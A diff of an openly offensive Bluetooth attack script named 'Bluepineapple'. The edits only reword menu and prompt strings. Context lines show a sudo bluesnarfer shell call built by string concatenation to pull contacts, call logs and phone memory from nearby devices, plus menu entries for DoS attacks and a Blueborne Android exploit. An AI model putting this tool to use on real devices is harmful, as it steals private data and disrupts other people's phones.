@@ -48,7 +48,7 @@ def bluesnarfer(mode):
     dc = 2
 
     if "list" in mode:
-        print("Listing available information, press CTRL + C to stop process.\n\n")
+        print("Listing available phone memory information, press CTRL + C to stop process.\n\n")
         os.system("sudo bluesnarfer -b "" " + mac + " -C " + pbc + " -l")
     if "contacts" in mode:
         print("Listing available contacts, press CTRL + C to stop process.\n\n")
@@ -76,7 +76,7 @@ def jieggi_DoS():
 
 def welcome():
     print("\n\n")
-    print("Bluepineapple by [INSERT_CLEVER_NAME_HERE]. it scan, it attac but most importantly it work for old bt devices")
+    print("Bluepineapple by [INSERT_CLEVER_NAME_HERE]. it scan, it attac but most importantly it work for old bt devices (sometimes)")
 
 def menu():
     print("\n\n")
@@ -87,7 +87,7 @@ def menu():
     print("5- DoS attack. Powered by jieggil script.")
     print("6- Bluesnarfing attack. Powered by Bluesnarfer")
     print("7- Blueborne CVE for android.")
-    print("8- DoS attack.")
+    print("8- DoS attack, the sequel.")
 
 def bye():
     print("\n\n")
@@ -111,7 +111,7 @@ def main():
         elif "5" in action:
             jieggi_DoS()
         elif "6" in action:
-            mode = input("\n\nChoose action (list, contacts, calls or info): ")
+            mode = input("\n\nChoose bluesnarfer action (list, contacts, calls or info): ")
             bluesnarfer(mode)
         elif "7" in action:
             blueborne()
